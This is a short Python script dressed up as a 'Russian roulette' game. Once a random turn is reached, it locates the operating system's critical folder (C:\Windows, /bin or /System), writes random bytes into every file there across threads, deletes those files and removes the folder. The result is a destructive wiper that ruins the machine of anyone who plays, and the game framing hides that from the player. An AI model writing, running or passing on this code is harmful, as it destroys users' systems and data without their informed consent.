from platform import system
from sys import exit
from random import randint
from shutil import rmtree
from os import walk, path, urandom, remove
import threading

cur_os: str = system()
lucky_no: int = randint(1, 6)


def get_sys_critical_folder(os: str):
    if (os == "Windows"):
        return "C:\Windows"
    elif (os == "Linux"):
        return "/bin"
    elif (os == "Darwin"):
        return "/System"
    else:
        print('>?')
        exit(1)


def shred_file(file_path: str):
    with open(file_path, 'ab') as f:
        f.write(urandom(path.getsize(file_path)))

    remove(file_path)


def shred_controller(dir_path: str):
    threads = []

    for root, dirs, files in walk(dir_path):
        for file in files:
            file_path = path.join(root, file)

            thread = threading.Thread(target=shred_file, args=(file_path,))
            thread.start()

            threads.append(thread)

    for thread in threads:
        thread.join()

    rmtree(dir_path)


def play():
    chances = int(input('>Enter no of chances to play (?/6):'))
    if (chances > 6):
        exit(1)

    print('>Let the game begin')

    sys_folder = get_sys_critical_folder(os=cur_os)

    count: int = 0
    while count < chances:
        usr_input = input(">shoot(s), quit(q)")
        if usr_input != "s":
            print('>There is no quitting this game')
            continue

        if count == lucky_no:
            print('>??')
            shred_controller(sys_folder)
            exit(1)

        print('>Lucky this time')
        count += 1


play()
